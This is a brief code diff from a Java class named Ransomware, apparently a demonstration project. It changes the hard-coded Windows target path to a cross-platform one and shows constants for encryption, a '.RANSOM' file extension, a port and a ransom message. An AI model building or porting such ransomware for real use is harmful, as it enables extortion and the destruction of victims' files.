@@ -35,7 +35,8 @@ public class Ransomware {
 	// In milliseconds, how long to wait before things are decrypted.
 	private static final int DECRYPTION_DELAY = 10000;
 	private static final int IV_LENGTH = 16;
-	private static final String TARGET_DIR = System.getProperty("user.home") + "\\Desktop\\testFolder";
+	private static final String TARGET_DIR = System.getProperty("user.home") + File.separator + 
+	"Desktop"+ File.separator  + "testFolder";
 	private static final String EXTENSION = ".RANSOM";
 	private static final int PORT_NUM = 2435;
 	private static final String RANSOM_TEXT = "You have been hit by ransomware! Your files will be "
